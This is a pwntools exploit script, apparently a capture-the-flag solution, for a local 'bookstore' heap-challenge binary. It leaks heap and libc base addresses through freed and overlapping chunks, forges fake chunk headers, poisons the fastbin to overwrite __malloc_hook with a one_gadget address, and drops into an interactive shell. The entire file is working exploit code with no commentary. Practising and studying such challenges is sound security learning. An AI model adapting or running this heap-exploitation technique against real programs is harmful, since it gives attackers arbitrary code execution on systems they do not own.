#!/usr/bin/env python
from pwn import *
p=process('./bookstore',env={'LD_PRELOAD':'./libc_64.so'})

elf=ELF('./libc_64.so')

context(arch='amd64',os='linux',log_level='debug')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)



def debugf(load=''):
    gdb.attach(p,load)

def menu(i):
    ru('choice:\n')
    sl(str(i))

def new(author_name,name_len,name,sline=1):
    menu(1)
    ru('name?\n')
    if sline:
        sl(author_name)
    else:
        sd(author_name)
    ru('name?\n')
    sl(str(name_len))
    ru('book?\n')
    if sline:
        sl(name)
    else:
        sd(name)

def sell(index):
    menu(2)
    ru('sell?\n')
    sl(str(index))

def read(index):
    menu(3)
    ru('sell?\n')
    sl(str(index))    


new('a',0x10,'a')
new('a',0x10,'a')
sell(1)
sell(0)
new('a',0x10,'')     
new('a',0x10,'a')     # 1
read(0)
ru('kname:')
heap_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x20
print(hex(heap_base))

new('a',0x10,'a')  
new('a',0x10,'a')   # 3
new('a',0x10,'a')   # 4
new('a',0x10,'a')   # 5
new('a',0x20,p64(0)+'\x21')   # 6          avoid malloc consolidate

new('7',0,'')        # 7
new('8',0x20,'')        # 8

sell(0)

payload=p64(0)*2                                 
payload+=p64(0)+p64(0x21)+p64(heap_base+0x40)+p64(heap_base+0x40)         
payload+=p64(0x20)+p64(0x90)+p64(heap_base+0x20)+p64(heap_base+0x20)         
payload+=(p64(0)+p64(0x21)+p64(0)+p64(0))*3
new('a',0,payload)      # 0

sell(2)

new('a',0,'')          # 2          same with 1
read(1)
read(2)
ru('kname:')

libc_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x3c4c18
elf.address=libc_base

malloc_hook=elf.symbols['__malloc_hook']
main_arena=malloc_hook+0x10

print(hex(libc_base))
print(hex(malloc_hook))
print(hex(main_arena))

sell(8)
sell(7)

payload='3'*0x10
payload+=p64(0)+p64(0x31)
payload+=p64(0x21)

new('7',0,payload)              # 7
new('8',0x20,'')                # 8

sell(1)
sell(0)
sell(2)
target=main_arena+0x10-0x8
new('a',0,p64(target))
new('a',0,p64(target))
new('a',0,p64(target))
payload='\x00'*0x40+p64(malloc_hook-0x10)
new('a',0,payload)


new('a',0x40,'')
new('a',0x30,'')

# debugf('nb 4009D6')
one_off=0x45216
one_off=0x4526a
# one_off=0xf0274
# one_off=0xf1117
one=libc_base+one_off
new('a',0,p64(one))

# new('a',0,'a')
menu(1)
ru('name?\n')
sl('a')
ru('name?\n')
sl(str(0))


p.interactive()